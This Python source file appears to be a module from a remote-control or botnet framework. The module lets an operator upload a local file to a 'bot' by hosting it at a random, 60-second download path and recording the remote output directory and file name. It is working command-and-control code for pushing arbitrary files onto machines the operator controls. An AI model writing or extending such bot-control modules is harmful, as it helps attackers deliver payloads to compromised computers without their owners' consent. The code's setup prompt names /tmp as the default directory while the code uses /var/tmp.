# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from server.modules.helper import *
from os import path
from threading import Thread
from time import sleep


class Module(ModuleABC):
    def get_info(self):
        return {
            "Author:": ["Marten4n6"],
            "Description": "Upload a file to the bot.",
            "References": [],
            "Stoppable": False
        }

    def get_setup_messages(self):
        return [
            "Path to the local file to upload: ",
            "Remote output directory (Leave empty for /tmp): ",
            "New file name (Leave empty to skip): "
        ]

    def setup(self, set_options):
        local_file = path.expanduser(set_options[0])
        output_dir = set_options[1]
        output_name = set_options[2]

        if not output_dir:
            output_dir = "/var/tmp"
        if not output_name:
            output_name = path.basename(local_file)

        if not path.exists(local_file):
            self._view.display_error("Failed to find local file: {}".format(local_file), "attention")
            return False, None
        else:
            download_path = random_string(16)

            self._model.add_upload_file(download_path, local_file)

            self._view.output("Started hosting the file at: /{}".format(download_path))
            self._view.output("This link will automatically expire after 60 seconds.")

            cleanup_thread = Thread(target=self._cleanup_thread, args=(download_path,))
            cleanup_thread.daemon = True
            cleanup_thread.start()

            return True, {
                "download_path": download_path,
                "output_dir": output_dir,
                "output_name": output_name
            }

    def _cleanup_thread(self, url_path):
        sleep(60 * 1)

        self._model.remove_upload_file(url_path)
        self._view.output_separator()
        self._view.output("Upload link expired", "info")
